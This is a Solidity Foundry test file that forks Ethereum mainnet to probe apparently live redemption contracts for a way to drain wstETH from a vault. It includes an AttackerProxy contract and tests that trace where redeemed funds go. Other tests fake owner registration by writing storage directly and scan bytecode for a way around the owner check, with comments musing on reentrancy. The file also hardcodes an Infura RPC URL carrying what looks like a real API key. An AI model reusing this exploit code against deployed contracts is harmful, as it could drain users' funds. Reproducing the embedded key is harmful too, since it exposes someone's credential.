// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract TraceRecipient is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TraceWhoReceivesWstETH() public {
        console.log("=== TRACING WHO RECEIVES wstETH ===\n");

        // When user calls R0.finalizeRedeem:
        // 1. R0 calculates amount from redemption request
        // 2. R0 calls RC.redeem(amount, to)
        // 3. RC sends wstETH to "to"

        // What is "to"?
        // From bytecode analysis, it's CALLER of R0 (the user)

        deal(TASSET, attacker, 100000e18);

        // Create a proxy contract that will call redeem
        AttackerProxy proxy = new AttackerProxy(REDEMPTION_0, TASSET);
        deal(TASSET, address(proxy), 100000e18);

        console.log("Attacker EOA:", attacker);
        console.log("Attacker Proxy:", address(proxy));

        // Track all balances
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 r0Before = IERC20(wstETH).balanceOf(REDEMPTION_0);
        uint256 rcBefore = IERC20(wstETH).balanceOf(REDEMPTION_CONTROLLER);

        console.log("\nBefore:");
        console.log("Vault wstETH:", vaultBefore / 1e18);
        console.log("R0 wstETH:", r0Before / 1e18);
        console.log("RC wstETH:", rcBefore / 1e18);

        // Call redeem THROUGH the proxy
        proxy.executeRedeem(1000e18);

        vm.warp(block.timestamp + 7 days);

        // Finalize through proxy
        proxy.executeFinalize(0);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 r0After = IERC20(wstETH).balanceOf(REDEMPTION_0);
        uint256 rcAfter = IERC20(wstETH).balanceOf(REDEMPTION_CONTROLLER);
        uint256 proxyWstETH = IERC20(wstETH).balanceOf(address(proxy));
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nAfter:");
        console.log("Vault wstETH:", vaultAfter / 1e18);
        console.log("R0 wstETH:", r0After / 1e18);
        console.log("RC wstETH:", rcAfter / 1e18);
        console.log("Proxy wstETH:", proxyWstETH / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        console.log("\nWhere did wstETH go?");
        if (proxyWstETH > 0) {
            console.log("*** PROXY RECEIVED THE wstETH! ***");
        }
        if (attackerWstETH > 0) {
            console.log("*** ATTACKER EOA RECEIVED THE wstETH! ***");
        }
    }

    function test_WhatIfProxyIsRegistered() public {
        console.log("=== WHAT IF ATTACKER'S PROXY IS REGISTERED IN RC? ===\n");

        // If somehow attacker's proxy contract is registered in RC's redemption mapping...
        // Then the proxy could call RC.redeem directly!

        AttackerProxy proxy = new AttackerProxy(REDEMPTION_0, TASSET);
        console.log("Attacker proxy:", address(proxy));

        // Register the proxy in RC (simulated - would need owner in real attack)
        // RC slot 4 is the redemption registry mapping
        bytes32 key = keccak256(abi.encode(address(proxy), uint256(4)));
        vm.store(REDEMPTION_CONTROLLER, key, bytes32(uint256(1)));

        // Verify registration
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
        console.log("Proxy registration value:", uint256(val));

        // Now proxy can call RC.redeem directly!
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(address(proxy));
        (bool success, bytes memory data) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("RC.redeem as proxy:", success);
        if (!success && data.length >= 4) {
            console.logBytes4(bytes4(data));
        }
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** EXPLOIT WORKS IF PROXY CAN BE REGISTERED! ***");
        }
    }

    function test_HowToRegisterProxy() public view {
        console.log("=== HOW TO REGISTER A PROXY IN RC? ===\n");

        // addRedemption selector: 0x1fe923d3
        // This is owner-only

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // Find what checks are done before writing to the registry
        console.log("Looking for registry write pattern:");

        // The pattern would be: check owner -> write to mapping
        // SLOAD 0 (owner) -> CALLER -> EQ -> JUMPI -> then write to mapping

        // Find SSTORE operations
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x55) { // SSTORE
                // Look for SHA3 before (mapping key computation)
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x20) { // SHA3
                        console.log("SSTORE at", i, "with SHA3 at", j);
                        break;
                    }
                }
            }
        }
    }

    function test_ExploreAddRedemptionFunction() public view {
        console.log("=== EXPLORING addRedemption FUNCTION ===\n");

        bytes memory code = REDEMPTION_CONTROLLER.code;

        // addRedemption selector: 0x1fe923d3
        // Find its jump target

        bytes4 addRedempSel = bytes4(0x1fe923d3);

        console.log("Searching for addRedemption in dispatcher:");
        for (uint i = 0; i + 10 < 400 && i < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == addRedempSel) {
                    console.log("Found at:", i);

                    // Find jump target
                    for (uint j = i + 5; j < i + 20 && j < code.length; j++) {
                        if (uint8(code[j]) == 0x61) {
                            uint16 target = uint16(uint8(code[j+1])) << 8 | uint8(code[j+2]);
                            console.log("Jumps to:", target);
                            break;
                        }
                    }
                }
            }
        }

        // Also check if there's any way to bypass the owner check
        // Maybe through a callback or reentrancy?
    }
}

contract AttackerProxy {
    address public redemption;
    address public tasset;
    address public owner;

    constructor(address _redemption, address _tasset) {
        redemption = _redemption;
        tasset = _tasset;
        owner = msg.sender;
    }

    function executeRedeem(uint96 amount) external {
        IERC20(tasset).approve(redemption, type(uint256).max);
        redemption.call(abi.encodeWithSignature("redeem(uint96)", amount));
    }

    function executeFinalize(uint256 index) external {
        redemption.call(abi.encodeWithSignature("finalizeRedeem(uint256)", index));
    }

    function withdraw(address token, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        IERC20(token).transfer(owner, amount);
    }

    receive() external payable {}
}
